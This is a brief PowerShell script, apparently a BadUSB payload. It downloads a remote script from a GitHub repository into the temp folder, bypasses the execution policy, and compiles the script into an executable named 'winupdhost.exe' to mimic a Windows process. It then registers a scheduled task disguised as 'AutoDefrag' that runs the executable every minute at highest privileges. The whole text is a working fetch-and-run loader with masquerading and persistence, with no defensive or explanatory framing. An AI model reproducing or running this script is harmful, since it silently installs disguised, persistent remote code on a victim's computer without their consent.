cd $env:Temp;
iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/raw.ps1 -O raw.ps1;
Start-Sleep 1;
Set-ExecutionPolicy -ExecutionPolicy Bypass;
Import-Module ps2exe;
Start-Sleep 1;
ps2exe.ps1 raw.ps1 winupdhost.exe;
Start-Sleep 1;
schtasks /create /tn "AutoDefrag" /tr "$env:Temp\winupdhost.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME";
exit
